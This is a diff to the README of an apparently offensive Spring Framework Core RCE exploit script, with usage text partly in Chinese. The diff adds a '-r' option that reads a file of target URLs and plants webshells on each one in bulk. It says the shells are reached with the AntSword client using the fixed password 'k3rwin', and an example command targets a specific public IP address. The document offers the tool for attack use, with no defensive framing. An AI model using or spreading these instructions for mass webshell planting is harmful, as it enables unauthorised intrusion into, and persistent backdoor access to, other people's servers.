@@ -25,15 +25,16 @@ $ python3 spring-core-rce.py -h
 
                                                  Spring framework Core RCE
                                                                   By:K3rwin
-usage: spring-core-rce.py [-h] [-u URL] [-s SYSTEM]
+usage: spring-core-rce.py [-h] [-u URL] [-s SYSTEM] [-r FILE]
 
-Spring framework Core RCE 帮助指南
+Spring framework Core 0day RCE 帮助指南
 
 optional arguments:
   -h, --help            show this help message and exit
   -u URL, --url URL     指定url
   -s SYSTEM, --system SYSTEM
                         指定目标主机操作系统,默认linux,参数为win/linux
+  -r FILE, --file FILE  指定url文件，批量写马
 ```
 
 ## 3.example
@@ -47,6 +48,16 @@ python3 spring-core-rce.py -u "http://1.117.155.217:8080/" -s "linux"
 ![image-20220331203209702](README.assets/image-20220331203209702.png)
 
 ![image-20220331203858753](README.assets/image-20220331203858753.png)
+
+> 使用 -r 批量写马 ，使用蚁剑连接，密码为k3rwin
+
+~~~shell
+python3 spring-core-rce.py -r "urls.txt"
+~~~
+
+![image-20220402112140568](README.assets/image-20220402112140568.png)
+
+![image-20220402112349943](README.assets/image-20220402112349943.png)
 
 ## 4.Target
 
